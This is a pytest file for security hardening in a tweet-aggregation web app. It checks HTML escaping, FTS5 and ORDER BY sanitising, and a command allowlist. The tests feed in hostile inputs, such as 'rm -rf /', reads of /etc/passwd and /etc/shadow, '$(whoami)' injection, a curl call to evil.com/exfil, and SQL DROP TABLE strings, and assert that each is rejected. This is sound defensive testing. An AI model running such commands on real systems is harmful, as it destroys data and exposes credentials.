"""Tests for security hardening fixes."""

import asyncio
from datetime import datetime, timezone

import pytest
from fastapi.testclient import TestClient

from twag.db import get_connection, init_db, insert_tweet, update_tweet_processing
from twag.db.accounts import get_accounts, upsert_account
from twag.db.search import get_feed_tweets, sanitize_fts5_query, search_tweets
from twag.notifier import format_alert
from twag.web.app import create_app
from twag.web.routes.context import (
    ALLOWED_COMMANDS,
    _resolve_command,
    _run_command,
    _validate_arguments,
    _validate_command_template,
)

# --- HTML injection tests (notifier) ---


class TestHTMLEscaping:
    def test_escapes_angle_brackets_in_content(self):
        msg = format_alert(
            tweet_id="123",
            author_handle="user",
            content="<script>alert('xss')</script>",
            category="macro",
            summary="test summary",
        )
        assert "<script>" not in msg
        assert "&lt;script&gt;" in msg

    def test_escapes_ampersand_in_content(self):
        msg = format_alert(
            tweet_id="123",
            author_handle="user",
            content="AT&T earnings beat",
            category="equities",
            summary="test",
        )
        assert "AT&amp;T" in msg

    def test_escapes_author_handle(self):
        msg = format_alert(
            tweet_id="123",
            author_handle="<b>evil</b>",
            content="hello",
            category="macro",
            summary="test",
        )
        assert "<b>" not in msg
        assert "&lt;b&gt;" in msg

    def test_escapes_summary(self):
        msg = format_alert(
            tweet_id="123",
            author_handle="user",
            content="hello",
            category="macro",
            summary='<a href="http://evil.com">click</a>',
        )
        assert "<a href" not in msg
        assert "&lt;a href" in msg

    def test_preserves_normal_content(self):
        msg = format_alert(
            tweet_id="123",
            author_handle="realuser",
            content="Fed holds rates steady at 5.25%",
            category="fed_policy",
            summary="Rate decision hold",
        )
        assert "realuser" in msg
        assert "Fed holds rates steady" in msg
        assert "Rate decision hold" in msg

    def test_empty_summary_no_crash(self):
        msg = format_alert(
            tweet_id="123",
            author_handle="user",
            content="test",
            category="macro",
            summary="",
        )
        assert "user" in msg


# --- FTS5 query sanitization tests ---


class TestFTS5Sanitization:
    def test_strips_braces(self):
        assert sanitize_fts5_query("test {injection}") == "test injection"

    def test_strips_brackets(self):
        assert sanitize_fts5_query("test [column]") == "test column"

    def test_strips_parens(self):
        assert sanitize_fts5_query("test (nested)") == "test nested"

    def test_strips_caret(self):
        assert sanitize_fts5_query("^test") == "test"

    def test_preserves_normal_query(self):
        assert sanitize_fts5_query("fed rate hike") == "fed rate hike"

    def test_preserves_quoted_phrase(self):
        result = sanitize_fts5_query('"interest rate"')
        assert '"interest rate"' in result

    def test_preserves_prefix_wildcard(self):
        assert sanitize_fts5_query("earn*") == "earn*"

    def test_preserves_and_or_not(self):
        assert sanitize_fts5_query("fed AND rate NOT hike") == "fed AND rate NOT hike"

    def test_empty_after_sanitization_raises(self):
        with pytest.raises(ValueError, match="empty"):
            sanitize_fts5_query("{}[]()^")

    def test_whitespace_only_raises(self):
        with pytest.raises(ValueError, match="empty"):
            sanitize_fts5_query("   ")

    def test_search_tweets_catches_bad_fts_query(self, tmp_path):
        """Malformed FTS5 queries return ValueError, not sqlite3.OperationalError."""
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            # Pure structural chars get sanitized to empty, raising ValueError
            with pytest.raises(ValueError, match="empty"):
                search_tweets(conn, "{}[]()")


# --- Command template validation tests ---


class TestValidateCommandTemplate:
    def test_allows_valid_command(self):
        _validate_command_template("twag search {ticker}")

    def test_allows_all_allowlisted_commands(self):
        for cmd in ALLOWED_COMMANDS:
            _validate_command_template(f"{cmd} --help")

    def test_rejects_empty_template(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="empty"):
            _validate_command_template("")

    def test_rejects_semicolon(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="metacharacters"):
            _validate_command_template("twag search; rm -rf /")

    def test_rejects_pipe(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="metacharacters"):
            _validate_command_template("twag search | cat /etc/passwd")

    def test_rejects_ampersand(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="metacharacters"):
            _validate_command_template("twag search & evil")

    def test_rejects_backtick(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="metacharacters"):
            _validate_command_template("twag search `whoami`")

    def test_rejects_dollar_sign(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="metacharacters"):
            _validate_command_template("twag search $(whoami)")

    def test_rejects_redirect(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="metacharacters"):
            _validate_command_template("twag search > /tmp/out")

    def test_rejects_non_allowlisted_command(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="not in the allowed list"):
            _validate_command_template("rm -rf /")

    def test_rejects_python(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="not in the allowed list"):
            _validate_command_template("python3 --version")

    def test_rejects_curl(self):
        from fastapi import HTTPException

        with pytest.raises(HTTPException, match="not in the allowed list"):
            _validate_command_template("curl https://evil.com/exfil")


class TestRunCommandValidation:
    """Test that _run_command also validates at execution time."""

    def test_rejects_non_allowlisted_at_runtime(self):
        _, stderr, code = asyncio.run(_run_command("python3 -c 'print(1)'"))
        assert code == -1
        assert "not in the allowed list" in stderr

    def test_rejects_metacharacters_at_runtime(self):
        _, stderr, code = asyncio.run(_run_command("echo hello; rm -rf /"))
        assert code == -1
        assert "metacharacters" in stderr


# --- Argument validation tests ---


class TestArgumentValidation:
    def test_rejects_absolute_path_for_cat(self):
        err = _validate_arguments("cat", ["/etc/passwd"])
        assert err is not None
        assert "Absolute paths" in err

    def test_rejects_absolute_path_for_grep(self):
        err = _validate_arguments("grep", ["-r", "password", "/etc/"])
        assert err is not None
        assert "Absolute paths" in err

    def test_rejects_path_traversal(self):
        err = _validate_arguments("cat", ["../../etc/passwd"])
        assert err is not None
        assert "traversal" in err

    def test_allows_relative_path(self):
        err = _validate_arguments("cat", ["data/tweets.json"])
        assert err is None

    def test_allows_flags(self):
        err = _validate_arguments("grep", ["-i", "pattern", "file.txt"])
        assert err is None

    def test_no_restrictions_on_echo(self):
        err = _validate_arguments("echo", ["/etc/passwd"])
        assert err is None

    def test_no_restrictions_on_twag(self):
        err = _validate_arguments("twag", ["/some/path"])
        assert err is None

    def test_run_command_blocks_absolute_path_at_runtime(self):
        _, stderr, code = asyncio.run(_run_command("cat /etc/passwd"))
        assert code == -1
        assert "Absolute paths" in stderr

    def test_run_command_blocks_traversal_at_runtime(self):
        _, stderr, code = asyncio.run(_run_command("head ../../etc/shadow"))
        assert code == -1
        assert "traversal" in stderr


# --- Resolve command tests ---


class TestResolveCommand:
    def test_resolves_echo(self):
        path = _resolve_command("echo")
        assert path is not None
        assert path.startswith("/")

    def test_rejects_unknown_command(self):
        assert _resolve_command("python3") is None

    def test_rejects_empty(self):
        assert _resolve_command("") is None


# --- API endpoint validation tests ---


def _make_app(monkeypatch, tmp_path):
    db_path = tmp_path / "test_security.db"
    monkeypatch.setattr("twag.web.app.get_database_path", lambda: db_path)
    return create_app()


class TestContextCommandAPI:
    def test_create_rejects_dangerous_template(self, monkeypatch, tmp_path):
        app = _make_app(monkeypatch, tmp_path)
        client = TestClient(app)
        resp = client.post(
            "/api/context-commands",
            json={
                "name": "evil",
                "command_template": "python3 -c 'import os; os.system(\"bad\")'",
            },
        )
        assert resp.status_code == 400

    def test_create_accepts_valid_template(self, monkeypatch, tmp_path):
        app = _make_app(monkeypatch, tmp_path)
        client = TestClient(app)
        resp = client.post(
            "/api/context-commands",
            json={
                "name": "ticker_search",
                "command_template": "twag search {ticker}",
            },
        )
        assert resp.status_code == 200
        assert resp.json()["name"] == "ticker_search"

    def test_update_rejects_dangerous_template(self, monkeypatch, tmp_path):
        app = _make_app(monkeypatch, tmp_path)
        client = TestClient(app)
        # First create a valid one
        client.post(
            "/api/context-commands",
            json={"name": "test_cmd", "command_template": "echo hello"},
        )
        # Then try to update with a dangerous one
        resp = client.put(
            "/api/context-commands/test_cmd",
            json={"name": "test_cmd", "command_template": "rm -rf /"},
        )
        assert resp.status_code == 400


# --- ORDER BY allowlist tests ---


def _create_fts_db(tmp_path):
    """Create a minimal DB with FTS index for search tests."""
    db_path = tmp_path / "test_orderby.db"
    init_db(db_path)
    with get_connection(db_path) as conn:
        insert_tweet(
            conn,
            tweet_id="t1",
            author_handle="tester",
            content="test market earnings",
            created_at=datetime.now(timezone.utc),
            source="test",
        )
        update_tweet_processing(
            conn,
            tweet_id="t1",
            relevance_score=8.0,
            categories=["macro"],
            summary="test",
            signal_tier="market_relevant",
            tickers=["SPX"],
        )
        conn.commit()
    return db_path


class TestSearchOrderByAllowlist:
    def test_valid_order_by_rank(self, tmp_path):
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            results = search_tweets(conn, "test", order_by="rank")
            assert len(results) >= 1

    def test_valid_order_by_score(self, tmp_path):
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            results = search_tweets(conn, "test", order_by="score")
            assert len(results) >= 1

    def test_valid_order_by_time(self, tmp_path):
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            results = search_tweets(conn, "test", order_by="time")
            assert len(results) >= 1

    def test_invalid_order_by_raises(self, tmp_path):
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            with pytest.raises(ValueError, match="Invalid order_by"):
                search_tweets(conn, "test", order_by="DROP TABLE tweets--")


class TestFeedOrderByAllowlist:
    def test_valid_order_by_relevance(self, tmp_path):
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            results = get_feed_tweets(conn, order_by="relevance")
            assert isinstance(results, list)

    def test_valid_order_by_latest(self, tmp_path):
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            results = get_feed_tweets(conn, order_by="latest")
            assert isinstance(results, list)

    def test_invalid_order_by_raises(self, tmp_path):
        db_path = _create_fts_db(tmp_path)
        with get_connection(db_path, readonly=True) as conn:
            with pytest.raises(ValueError, match="Invalid order_by"):
                get_feed_tweets(conn, order_by="1; DROP TABLE tweets--")


# --- LIMIT parameterization test ---


class TestAccountsLimitParameterized:
    def test_get_accounts_with_limit(self, tmp_path):
        db_path = tmp_path / "test_accounts.db"
        init_db(db_path)
        with get_connection(db_path) as conn:
            upsert_account(conn, "alice")
            upsert_account(conn, "bob")
            upsert_account(conn, "carol")
            conn.commit()

            results = get_accounts(conn, limit=2)
            assert len(results) == 2

    def test_get_accounts_without_limit(self, tmp_path):
        db_path = tmp_path / "test_accounts_nolimit.db"
        init_db(db_path)
        with get_connection(db_path) as conn:
            upsert_account(conn, "alice")
            upsert_account(conn, "bob")
            conn.commit()

            results = get_accounts(conn)
            assert len(results) == 2


# --- CORS configuration test ---


class TestCORSConfig:
    def test_cors_allows_localhost(self, monkeypatch, tmp_path):
        app = _make_app(monkeypatch, tmp_path)
        client = TestClient(app)
        resp = client.options(
            "/api/tweets",
            headers={
                "Origin": "http://localhost:8080",
                "Access-Control-Request-Method": "GET",
            },
        )
        assert resp.headers.get("access-control-allow-origin") == "http://localhost:8080"

    def test_cors_methods_are_explicit(self, monkeypatch, tmp_path):
        app = _make_app(monkeypatch, tmp_path)
        client = TestClient(app)
        resp = client.options(
            "/api/tweets",
            headers={
                "Origin": "http://localhost:8080",
                "Access-Control-Request-Method": "GET",
            },
        )
        allowed = resp.headers.get("access-control-allow-methods", "")
        # Should list explicit methods, not wildcard
        assert "*" not in allowed
        assert "GET" in allowed


# --- Web server defaults test ---


class TestWebServerDefaults:
    def test_default_host_is_localhost(self):
        from twag.cli.web import web

        # Click params are accessible via the command's params list
        host_param = next(p for p in web.params if p.name == "host")
        assert host_param.default == "127.0.0.1"

    def test_default_reload_is_false(self):
        from twag.cli.web import web

        reload_param = next(p for p in web.params if p.name == "reload")
        assert reload_param.default is False
